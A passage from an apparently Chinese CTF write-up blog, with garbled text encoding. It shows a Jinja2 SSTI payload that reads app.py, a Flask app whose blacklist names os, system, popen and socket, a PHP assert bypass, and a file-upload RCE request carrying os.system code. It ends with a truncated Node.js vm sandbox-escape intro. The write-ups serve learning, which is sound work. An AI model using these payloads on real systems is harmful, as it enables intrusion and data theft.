%&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤æ¡éƒ½æ˜¯æ²¡æœ‰å›æ˜¾çš„</p><p>çœ‹å¤§ä½¬çš„åšæ³•æ˜¯åµŒå¥—ä¸€å±‚ifæ¥æ‰¾åˆ°catch_warnings,ç„¶åæ„é€ è¯»å–app.py</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>è¯»åˆ°çš„ä»£ç æ‰‹åŠ¨fomatä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for </span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm </span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField </span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired </span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span> </span><br><span class="line">bootstrap = Bootstrap(app) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64Â Ã†&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;ÃÂ¤&#x27;</span>) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64Ã£Ã†&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;ÃÂ¤&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list : </span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() : </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(): </span><br><span class="line">    txt = <span class="string">&quot;1%CÂŸKÃ&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64encode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ã“Âœ :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode())) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash(tmp) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;Â Ã†&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64decode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ã“Âœ  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode()) </span><br><span class="line">        <span class="keyword">if</span> waf(tmp) : </span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash( res ) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm1(text) </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;Ã£Ã†&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>): </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¦äº†ä¸€äº›å¸¸ç”¨çš„è¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h1&gt;&lt;p&gt;åœ¨è§£å¯†çš„</summary>
      
    
    
    
    <category term="buuåˆ·é¢˜è®°å½•" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Flaskå®¡è®¡" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="jinja2" scheme="http://example.com/tags/jinja2/"/>
    
  </entry>
  
  <entry>
    <title>nssctf-#round-17-basic-web</title>
    <link href="http://example.com/2024/01/28/nssctf-round-17-basic-web/"/>
    <id>http://example.com/2024/01/28/nssctf-round-17-basic-web/</id>
    <published>2024-01-28T09:29:36.000Z</published>
    <updated>2024-01-28T09:31:16.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-Round-17-Basic-Web"><a href="#NSSCTF-Round-17-Basic-Web" class="headerlink" title="NSSCTF Round#17 Basic Web"></a>NSSCTF Round#17 Basic Web</h1><h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><p>ä¸€ç‚¹è¿›å»å°±çœ‹è§ç½‘é¡µæ ‡é¢˜robots?</p><p>çœ‹ä¸‹robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„hintä¸éš¾å‘ç°åªæœ‰16è¿›åˆ¶çš„å­—æ¯,16è¿›åˆ¶è§£ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åç†Ÿæ‚‰å—,æ–°ç”Ÿèµ›å¯é‡è§è¿‡å“¦~</span><br><span class="line">è®°å¾—ç”¨æˆ·åå…¨ç”¨å°å†™å“¦ï½ï½</span><br></pre></td></tr></table></figure><p>ç¡®å®æ˜¯æ²¡ä»€ä¹ˆç”¨</p><p>passwordåº”è¯¥æ˜¯baseç¼–ç </p><p>ç”¨ä¸€æ¬¡base32ï¼‹ä¸€æ¬¡base64è§£å¾—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c9fa95881ea0152791d4a759dacd79de</span><br></pre></td></tr></table></figure><p>å†ç”¨åœ¨çº¿çš„MD5è§£å¯†å·¥å…·è§£å¾—å¯†ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nss</span><br></pre></td></tr></table></figure><p>MD5è§£å¯†ç½‘ç«™:<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p>è‡³äºusername,æ±‚åŠ©æŸå¯†ç æ‰‹tldyså¾—çŸ¥æ˜¯æ£‹ç›˜å¯†ç </p><p>è§£å¾—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer</span><br></pre></td></tr></table></figure><p>ç™»å½•æˆåŠŸåæŸ¥çœ‹ç½‘é¡µæºä»£ç ,æŒ‰ç…§hintè®¿é—®&#x2F;F111n4l.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!æ­¤è·¯ä¸é€šï¼ï¼&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œä¸æ˜¯è¯´äº†å—ï¼ï¼ï¼å¿…é¡»æ˜¯ 732339662 (æ‹›æ–°ç¾¤ç¾¤å·ï¼)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å•Šï¼Ÿè¿™æ˜¯ä»€ä¹ˆæ–°å‹æ¯”è¾ƒï¼Ÿ&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ˜¯ä¸æ˜¯é¢˜é”™äº†å•Š&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªphpæ¯”è¾ƒåœ¨ç½‘ä¸Šä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æŸ¥åˆ°è§£æ³•</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155341527.png" alt="image-20240128155341527"></p><p>æ‹¿åˆ°flag</p><h2 id="çœŸçš„æ˜¯æ–‡ä»¶ä¸Šä¼ å—ï¼Ÿ"><a href="#çœŸçš„æ˜¯æ–‡ä»¶ä¸Šä¼ å—ï¼Ÿ" class="headerlink" title="çœŸçš„æ˜¯æ–‡ä»¶ä¸Šä¼ å—ï¼Ÿ"></a>çœŸçš„æ˜¯æ–‡ä»¶ä¸Šä¼ å—ï¼Ÿ</h2><p>ä¸€è¿›å»å°±çœ‹è§fuckç¼–ç </p><p>è§£ç ç»“æœ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BrainFuckè§£ç :You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!**************</span><br></pre></td></tr></table></figure><p>ç»å…¸çš„give me a flag</p><p>getä¼ å‚ä¸€ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155903200.png" alt="image-20240128155903200"></p><p>è¿™é‡Œå·®ç‚¹ä»¥ä¸ºæ˜¯sstiäº†,å¹¸äºæ²¡æœ‰é’»ç‰›è§’å°–,è¯•äº†ä¸€æ‰‹å°±æ²¡ç®¡äº†</p><p>æºç é‡Œé¢æœ‰ä¸œè¥¿,ä½†æ˜¯å¥½åƒæ²¡ä»€ä¹ˆç”¨</p><p>è¿˜æ˜¯çœ‹uploadçš„åœ°æ–¹</p><p>éšä¾¿ä¼ ä¸€å¼ å›¾ç‰‡,å‘ç°å±…ç„¶ä¼šæŠ¥é”™</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:01:19 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>265</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml">é˜¿å¯¹å¯¹å¯¹ä¼ å¯¹äº† é‚£è·¯å¾„åœ¨å“ªé‡Œå‘¢ï¼Ÿ!<span class="comment">&lt;!--   File &quot;upload/35341583_p0.jpg&quot;, line 1</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">SyntaxError: Non-UTF-8 code starting with &#x27;\xff&#x27; in file upload/35341583_p0.jpg on line 1, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details --&gt;</span></span></span><br></pre></td></tr></table></figure><p>æŸ¥äº†ä¸‹è¿™ä¸ªpep</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160326244.png" alt="image-20240128160326244"></p><p>ä¼¼ä¹æ˜¯è¯­æ³•è§„èŒƒ,æˆ–è®¸è¿™é‡Œç›´æ¥æ‰§è¡Œäº†pythonä»£ç ?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160521433.png" alt="image-20240128160521433"></p><p>ç¡®å®æ˜¯å•Š</p><p>é‚£å°±å¯ä»¥ç›´æ¥rce</p><p>é€šè¿‡æŸ¥çœ‹app.pyçš„å†…å®¹,å‘ç°flagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p><p>æœ€ç»ˆpoc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------251223018415561458614127786332</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;3.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">os.<span class="keyword">system</span>(<span class="string">&#x27;echo $FLAG&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:07:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">é˜¿å¯¹å¯¹å¯¹ä¼ å¯¹äº† é‚£è·¯å¾„åœ¨å“ªé‡Œå‘¢ï¼Ÿ!<span class="comment">&lt;!-- NSSCTF</span></span><span class="template-variable">&#123;b86f6f24-8687-43ec-95b2-7bd2504b711b&#125;</span><span class="language-xml"><span class="comment"> --&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-Round-17-Basic-Web&quot;&gt;&lt;a href=&quot;#NSSCTF-Round-17-Basic-Web&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF Round#17 Basic Web&quot;&gt;&lt;/a&gt;NSSCTF Roun</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>åˆæ­¥è®¤è¯†NodeJs VMå’ŒVM2æ²™ç®±é€ƒé€¸</title>
    <link href="http://example.com/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://example.com/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2024-01-24T09:13:05.000Z</published>
    <updated>2024-01-25T08:06:01.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h2 id="å¸¸ç”¨çš„vmæ¨¡å—çš„API"><a href="#å¸¸ç”¨çš„vmæ¨¡å—çš„API" class="headerlink" title="å¸¸ç”¨çš„vmæ¨¡å—çš„API"></a>å¸¸ç”¨çš„vmæ¨¡å—çš„API</h2><h4 id="vm-runinThisContext-code"><a href="#vm-runinThisContext-code" class="headerlink" title="vm.runinThisContext(code)"></a>vm.runinThisContext(code)</h4><blockquote><p>åœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183902-378e6dda-672d-1.png"></p><p>ç¤ºä¾‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;initial value&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vmResult:&#x27;</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;localVar:&#x27;</span>, localVar); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmResult: vm</span><br><span class="line">localVar: initial value</span><br></pre></td></tr></table></figure><h4 id="vm-createContext-sandbox"><a href="#vm-createContext-sandbox" class="headerlink" title="vm.createContext([sandbox])"></a>vm.createContext([sandbox])</h4><blockquote><p> åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡__åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸ__ï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨__æ— æ³•è®¿é—®globalä¸­çš„å±æ€§__ã€‚</p></blockquote><h4 id="vm-runInContext-code-contextifiedSandbox-options"><a href="#vm-runInContext-code-contextifiedSandbox-options" class="headerlink" title="vm.runInContext(code, contextifiedSandbox[, options])"></a>vm.runInContext(code, contextifiedSandbox[, options])</h4><blockquote><p>å‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183946-521c54fa-672d-1.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">globalVar</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 